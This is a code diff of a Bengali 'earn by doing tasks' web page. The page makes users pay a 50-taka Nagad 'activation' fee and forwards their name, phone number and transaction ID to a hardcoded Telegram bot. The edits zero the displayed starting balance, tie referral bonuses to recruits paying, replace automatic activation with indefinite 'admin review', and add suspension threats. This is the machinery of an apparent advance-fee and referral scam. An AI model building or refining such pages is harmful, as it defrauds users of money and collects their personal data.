@@ -44,7 +44,7 @@
                 </div>
                 <div>
                     <h4 class="font-bold text-amber-300 text-xs">অ্যাকাউন্টটি ইনঅ্যাক্টিভ রয়েছে!</h4>
-                    <p class="text-[11px] text-slate-300 mt-0.5">কাজ শুরু করতে ৫০ দিয়ে একাউন্ট একটিভ করুন।</p>
+                    <p class="text-[11px] text-slate-300 mt-0.5">৫০ টাকা দিয়ে একাউন্ট একটিভ করুন।</p>
                 </div>
             </div>
             <button onclick="openActivationModal()" class="bg-gradient-to-r from-amber-500 to-orange-600 text-slate-950 font-extrabold px-3.5 py-2.5 rounded-2xl text-xs shadow-lg shadow-orange-500/20 flex items-center gap-1 hover:scale-105 transition shrink-0">
@@ -63,7 +63,7 @@
                 </div>
                 <div class="text-right bg-slate-800/80 backdrop-blur-md px-4 py-2.5 rounded-2xl border border-slate-700">
                     <p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">MAIN BALANCE</p>
-                    <h1 class="text-2xl font-black mt-0.5 text-emerald-400" id="mainBalanceDisplay">৳50.00</h1>
+                    <h1 class="text-2xl font-black mt-0.5 text-emerald-400" id="mainBalanceDisplay">৳0.00</h1>
                 </div>
             </div>
         </div>
@@ -76,7 +76,7 @@
                 </div>
                 <div>
                     <h4 class="font-extrabold text-xs text-emerald-300">রেফার করুন ও প্রিমিয়াম আয় করুন!</h4>
-                    <p class="text-[11px] text-slate-300">প্রতি সফল রেফারে ইনস্ট্যান্ট পান <b class="text-emerald-400">৫০ টাকা</b> 💸</p>
+                    <p class="text-[11px] text-slate-300">প্রতি সফল রেফারে পান <b class="text-emerald-400">৫০ টাকা</b> (রেফারকৃত ব্যক্তি একটিভ করলে) 💸</p>
                 </div>
             </div>
             <div class="flex items-center bg-slate-900/90 rounded-2xl p-1.5 border border-slate-700">
@@ -239,7 +239,7 @@
                     <i class="fa-solid fa-bolt text-xl"></i>
                 </div>
                 <h3 class="text-lg font-bold text-white">একাউন্ট একটিভ করুন</h3>
-                <p class="text-xs text-rose-400 font-medium mt-1">⚠️ অবশ্যই ৫০ টাকা Send Money করতে হবে!</p>
+                <p class="text-xs text-rose-400 font-medium mt-1">⚠️ ৫০ টাকা সেন্ড করার পর সঠিক তথ্য দিন!<br><span class="text-rose-500 font-bold">ভুল তথ্য দিলে একাউন্ট সাসপেন্ড করে দেওয়া হবে ❌</span></p>
             </div>
             <div class="bg-slate-800/80 border border-slate-700 p-3.5 rounded-2xl mb-4 text-xs text-slate-300 space-y-1">
                 <p class="flex justify-between items-center">
@@ -262,7 +262,7 @@
                     <input type="text" id="senderTrxid" placeholder="যেমন: 7K89X10L" required class="w-full px-3.5 py-3 bg-slate-800 border border-slate-700 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500">
                 </div>
                 <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-slate-950 font-extrabold py-3 rounded-xl text-xs shadow-lg shadow-emerald-500/20 mt-2 transition">
-                    তথ্য জমা দিন
+                    অ্যাক্টিভেশনের জন্য রিকোয়েস্ট পাঠান
                 </button>
             </form>
         </div>
@@ -284,7 +284,7 @@
             
             <div class="bg-gradient-to-r from-teal-900/40 to-emerald-900/40 border border-teal-500/30 p-4 rounded-2xl text-white text-center mb-4 shadow-inner">
                 <p class="text-[10px] uppercase font-bold tracking-wider text-teal-300">বর্তমান ব্যালেন্স</p>
-                <h2 class="text-2xl font-black mt-0.5 text-emerald-400" id="modalBalanceDisplay">৳50.00</h2>
+                <h2 class="text-2xl font-black mt-0.5 text-emerald-400" id="modalBalanceDisplay">৳0.00</h2>
             </div>
 
             <form onsubmit="handleWithdrawSubmit(event)" class="space-y-3">
@@ -377,7 +377,7 @@
         const CHAT_ID = '6733473116';
 
         let isAccountActive = localStorage.getItem('hi_account_active') === 'true';
-        let userBalance = localStorage.getItem('hi_user_balance') !== null ? parseFloat(localStorage.getItem('hi_user_balance')) : 50.00;
+        let userBalance = localStorage.getItem('hi_user_balance') !== null ? parseFloat(localStorage.getItem('hi_user_balance')) : 0.00;
 
         window.addEventListener('DOMContentLoaded', () => {
             const savedName = localStorage.getItem('hi_user_name');
@@ -414,7 +414,7 @@
 
         function checkTaskAccess(taskName) {
             if (!isAccountActive) {
-                showCustomPopup('⚠️ দয়া করে আমাদের সব গুলো প্রজেক্টে কাজ করার আগে আপনার একাউন্ট টি Active করুন!');
+                showCustomPopup('⚠️ দয়া করে কাজ শুরু করার আগে আপনার অ্যাকাউন্ট ৫০ টাকা দিয়ে Active করুন!');
                 return;
             }
             showCustomPopup(taskName + ' সেকশনে আপনাকে স্বাগতম!');
@@ -438,7 +438,7 @@
 
         function copyReferLink() {
             if (!isAccountActive) {
-                showCustomPopup('⚠️ দয়া করে রেফার করার আগে আপনার একাউন্টি Active করে নিন!');
+                showCustomPopup('⚠️ অ্যাকাউন্ট একটিভ না করলে রেফার লিংক কাজ করবে না!');
                 return;
             }
             const copyText = document.getElementById("referLinkInput");
@@ -456,10 +456,10 @@
             const trxid = document.getElementById('senderTrxid').value;
             const submitBtn = document.getElementById('submitBtn');
 
-            submitBtn.innerText = 'জমা হচ্ছে...';
+            submitBtn.innerText = 'রিকোয়েস্ট পাঠানো হচ্ছে...';
             submitBtn.disabled = true;
 
-            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট (৫০ টাকা)!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
+            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট (৫০ টাকা)!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}%0A%0A⚠️ *সতর্কতা:* ভুল বা ভুয়া তথ্য দিলে একাউন্ট সাসপেন্ড করে দেওয়া হবে ❌`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
 
             fetch(url)
@@ -467,22 +467,10 @@
                 .then(data => {
                     if (data.ok) {
                         if(name) {
-                            document.getElementById('userNameDisplay').innerText = name.toUpperCase();
-                            document.getElementById('profileNameDisplay').innerText = name.toUpperCase();
                             localStorage.setItem('hi_user_name', name);
                         }
-                        
-                        isAccountActive = true;
-                        localStorage.setItem('hi_account_active', 'true');
-
-                        document.getElementById('statusText').innerText = 'Active';
-                        document.getElementById('badgeStatus').className = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[10px] px-2.5 py-1 rounded-full font-bold flex items-center gap-1";
-                        document.getElementById('profileStatusBadge').className = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[10px] px-3 py-1 rounded-full font-bold inline-block mt-1";
-                        document.getElementById('profileStatusBadge').innerText = "Active User";
-                        document.getElementById('inactiveAlertCard').style.display = 'none';
-
                         closeModal('activationModal');
-                        showCustomPopup('আপনার তথ্য সফলভাবে জমা হয়েছে! অ্যাকাউন্ট সফলভাবে একটিভ করা হয়েছে।');
+                        showCustomPopup('আপনার পেমেন্ট রিকোয়েস্ট সফলভাবে সাবমিট হয়েছে। অ্যাডমিন পেমেন্ট চেক করার পর আপনার অ্যাকাউন্ট ও বোনাস ৫০ টাকা একটিভ করে দেওয়া হবে। ভুল তথ্য দিলে অ্যাকাউন্ট সাসপেন্ড করা হবে।');
                     } else {
                         showCustomPopup('তথ্য পাঠাতে সমস্যা হয়েছে, আবার চেষ্টা করুন।');
                     }
@@ -491,7 +479,7 @@
                     showCustomPopup('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
                 })
                 .finally(() => {
-                    submitBtn.innerText = 'তথ্য জমা দিন';
+                    submitBtn.innerText = 'অ্যাক্টিভেশনের জন্য রিকোয়েস্ট পাঠান';
                     submitBtn.disabled = false;
                 });
         }
@@ -500,7 +488,7 @@
             event.preventDefault();
             
             if (!isAccountActive) {
-                showCustomPopup('⚠️ অ্যাকাউন্ট একটিভ ছাড়া উইথড্র করা যাবে না!');
+                showCustomPopup('⚠️ অ্যাকাউন্ট একটিভ ছাড়া উইথড্র করা যাবে না!');
                 return;
             }
 
